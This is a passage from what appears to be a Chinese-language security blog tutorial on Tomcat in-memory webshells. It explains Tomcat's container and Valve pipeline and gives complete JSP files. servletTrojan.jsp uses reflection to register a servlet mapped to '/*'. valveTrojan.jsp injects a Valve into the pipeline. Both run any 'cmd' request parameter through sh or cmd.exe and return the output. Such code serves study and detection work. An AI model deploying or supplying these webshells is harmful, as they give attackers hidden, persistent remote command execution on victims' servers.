class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-生成恶意servlet"><a href="#2-生成恶意servlet" class="headerlink" title="2.生成恶意servlet"></a>2.生成恶意servlet</h3><p>ApplicationFilterChain#doFilter()会调用servlet.service()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214354359.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214354359.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228214354359"></p><p>service()方法实际上在HttpServlet.class中，提供了多种http方法，所以我们不仅可以在servlet中重写doGet、doPost等触发RCE，还能直接重写service</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214839952.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228214839952.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228214839952"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpServlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">         <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">             <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">             <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                 isLinux = <span class="literal">false</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">             <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">             <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">             <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">             response.getWriter().write(output);</span><br><span class="line">             response.getWriter().flush();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-生成wrapper，封装进context"><a href="#3-生成wrapper，封装进context" class="headerlink" title="3.生成wrapper，封装进context"></a>3.生成wrapper，封装进context</h3><p>createWrapper()创建wrapper，设置servletName，修改LoadOnStartup属性值，还有ServletClass指向类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">   wrapper.setName(<span class="string">&quot;servletTrojan&quot;</span>);</span><br><span class="line">   wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">   wrapper.setServlet(servlet);</span><br><span class="line">   wrapper.setServletClass(HttpServlet.class.getName());</span><br><span class="line"></span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-添加映射"><a href="#4-添加映射" class="headerlink" title="4.添加映射"></a>4.添加映射</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/*&quot;</span>, <span class="string">&quot;servletTrojan&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//servletTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setName(<span class="string">&quot;servletTrojan&quot;</span>);</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setServlet(servlet);</span><br><span class="line">    wrapper.setServletClass(HttpServlet.class.getName());</span><br><span class="line"></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/*&quot;</span>, <span class="string">&quot;servletTrojan&quot;</span>);</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;inject done!&quot;</span>);</span><br><span class="line">    out.flush();</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>测试的时候记得把上一个马删掉，以免冲突</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215800071.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215800071.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228215800071"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215818947.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228215818947.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228215818947"></p><h2 id="四、valve内存马"><a href="#四、valve内存马" class="headerlink" title="四、valve内存马"></a>四、valve内存马</h2><p>value是Tomcat中对Container组件进行的扩展。Container组件也就是前文一直提及的Tomcat四大容器</p><p>Tomcat由四大容器组成，分别是<strong>Engine、Host、Context、Wrapper</strong>。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：</p><blockquote><p>   Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。<br>   Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml。<br>    Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。<br>    Wrapper（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。 </p></blockquote><p>这四大组件都有自己的管道Pipeline。就像前文Filter和Servlet的实际处理请求的方法，都在Wrapper的管道Pipeline-&gt;Valve-ValveBase-StandardWrapperValve#invoke方法中调用</p><p>Pipeline就相当于拦截器链，具体看<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p>当请求到达<code>Engine</code>容器的时候，<code>Engine</code>并非是直接调用对应的<code>Host</code>去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做<code>pipeline</code>组件</p><p>valve接口</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228221503105.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228221503105.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228221503105"></p><p>valve的invoke方法将请求传入下一个valve。如果不调用下一个valve的invoke，那请求到此中断</p><p>在servlet调试时也能看到依次调用valve的过程：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124851725.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124851725.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229124851725"></p><p><code>Valve</code>存放的方式并非统一存放在<code>Pipeline</code>中，而是像一个链表一个接着一个。</p><p>调用<code>getNext()</code>方法即可获取在这个<code>Pipeline</code>上的下个<code>Valve</code>实例</p><p>一般使用实现了valve接口的ValveBase类：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229123320805.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229123320805.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229123320805"></p><h3 id="valve的生成和配置"><a href="#valve的生成和配置" class="headerlink" title="valve的生成和配置"></a>valve的生成和配置</h3><h4 id="1-新建valve"><a href="#1-新建valve" class="headerlink" title="1.新建valve"></a>1.新建valve</h4><p>新建valve只需要继承ValveBase类并实现invoke方法，pipeline管道会依次执行valve的invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-注册valve"><a href="#2-注册valve" class="headerlink" title="2.注册valve"></a>2.注册valve</h4><p><strong>四大组件Engine&#x2F;Host&#x2F;Context&#x2F;Wrapper都有自己的Pipeline</strong>，在ContainerBase基类里定义了Pipeline:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124307546.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124307546.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229124307546"></p><p>而StandardPipeline标准类里有addValve方法</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124444164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229124444164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229124444164"></p><h4 id="3-调用valve"><a href="#3-调用valve" class="headerlink" title="3.调用valve"></a>3.调用valve</h4><p>在CoyoteAdapter.service()获取了Pipeline的第一个Valve，并且调用了invoke</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125043383.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125043383.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229125043383"></p><p>这里的第一个valve就是StandardEngineValve</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125227060.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125227060.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229125227060"></p><p>跟进到StandardEngineValve#invoke，可以看到调用了下一个invoke，在左下角的调试框，也就是valve.invoke的调用顺序</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125422446.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229125422446.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229125422446"></p><p>根据valve的生成和配置，模拟注册恶意valve：</p><ol><li>获取context</li><li>从StandardContext反射获取StandardPipeline</li><li>调用addValve添加恶意Valve</li></ol><h3 id="1-获取context-3"><a href="#1-获取context-3" class="headerlink" title="1. 获取context"></a>1. 获取context</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure><h3 id="2-反射获取StandardPipeline"><a href="#2-反射获取StandardPipeline" class="headerlink" title="2. 反射获取StandardPipeline"></a>2. 反射获取StandardPipeline</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">pipelineField</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">standardPipeline1</span> <span class="operator">=</span> (StandardPipeline) pipelineField.get(standardContext);</span><br></pre></td></tr></table></figure><h3 id="3-创建注册恶意valve并添加进standardPipeline"><a href="#3-创建注册恶意valve并添加进standardPipeline" class="headerlink" title="3. 创建注册恶意valve并添加进standardPipeline"></a>3. 创建注册恶意valve并添加进standardPipeline</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span>&#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">           Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   standardPipeline1.addValve(valveBase);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了使正常invoke能进行下去，恶意valve也应该调用下一个valve.invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.getNext().invoke(request, response);</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//valveTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">pipelineField</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">standardPipeline1</span> <span class="operator">=</span> (StandardPipeline) pipelineField.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> ServletException,IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    standardPipeline1.addValve(valveBase);</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;evil valve inject done!&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229130722086.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229130722086.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229130722086"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229131412313.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229131412313.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221229131412313"></p><h2 id="others"><a href="#others" class="headerlink" 